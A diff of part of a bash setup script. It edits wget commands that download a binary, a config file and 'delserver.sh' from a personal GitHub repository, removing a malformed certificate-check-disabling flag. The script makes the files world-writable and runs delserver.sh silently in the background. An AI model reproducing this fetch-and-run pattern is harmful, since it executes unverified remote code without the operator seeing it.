@@ -713,8 +713,8 @@ sync && echo 3 >/proc/sys/vm/dro
 cd /$HOME/
 mkdir myssqltcp
 cd /$HOME/myssqltcp
-wget –no-check-certificate https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
-wget –no-check-certificate https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
@@ -1464,7 +1464,7 @@ echo ""
 
 cd /$HOME/
 rm -f index.html
-wget –no-check-certificate https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 
